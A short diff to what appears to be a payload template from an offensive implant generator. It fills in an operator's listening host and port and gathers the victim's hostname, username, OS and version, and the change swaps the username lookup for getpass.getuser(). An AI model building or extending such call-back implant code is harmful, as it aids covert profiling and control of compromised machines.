@@ -416,13 +416,15 @@ import socket
 import time
 import requests
 import subprocess
+import getpass
 
 SERVER_IP = "{payload_settings['lhost']}"
 SERVER_PORT = "{payload_settings['lport']}"
 WAITTIME = {waittime}
 
 HOSTNAME = socket.gethostname()
-USER = os.getlogin()
+#USER = os.getlogin()
+USER = getpass.getuser()
 OS = platform.system()
 VERSION = platform.release()
 
